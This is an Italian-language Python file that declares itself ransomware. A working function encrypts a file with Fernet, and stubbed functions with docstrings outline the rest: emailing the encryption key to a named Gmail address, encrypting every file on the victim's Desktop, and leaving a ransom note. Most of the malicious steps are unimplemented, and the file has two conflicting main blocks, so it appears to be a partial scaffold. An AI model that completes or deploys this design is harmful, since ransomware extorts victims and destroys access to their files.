from cryptography.fernet import Fernet

def genera_chiave():
    """Genera una chiave casuale per la cifratura dei
    file e la invia per email a pierobrandola@gmail.com
    """
    pass

def cifra_file_singolo(file_path, chiave):
    try:
        # Leggi il contenuto del file
        with open(file_path, 'rb') as file:
            file_data = file.read()

        # Crea un oggetto Fernet con la chiave
        fernet = Fernet(chiave)

        # Cifra i dati del file
        file_cifrato = fernet.encrypt(file_data)

        # Crea il nome del file cifrato
        file_cifrato_path = file_path + '.enc'

        # Scrivi i dati cifrati nel nuovo file
        with open(file_cifrato_path, 'wb') as encrypted_file:
            encrypted_file.write(file_cifrato)

        print(f"File cifrato con successo: {file_cifrato_path}")
    except Exception as e:
        print(f"Si è verificato un errore durante la cifratura del file: {str(e)}")

# Esempio di utilizzo
if __name__ == "__main__":
    file_da_cifrare = "C:\\Users\\rnd\\Desktop\\prova.txt"
    chiave = Fernet.generate_key().decode()  # Genera una chiave Fernet casuale e la converte in stringa
    cifra_file_singolo(file_da_cifrare, chiave)

def cifra_tutti_i_file(chiave):
    """Scorre tutti i file nella directory Desktop
    dell'utente corrente e li cifra usando la funzione
    cifra_file_singolo
    """
    pass

def scrivi_messaggio_minatorio():
    """Scrive un file di testo con la richiesta di
    riscatto sul Desktop dell'utente corrente.
    """
    pass

if __name__ == "__main__":
    print("Benvenuti nel nostro fantastico RANSOMWARE")
    chiave = genera_chiave()
    cifra_tutti_i_file(chiave)
    scrivi_messaggio_minatorio()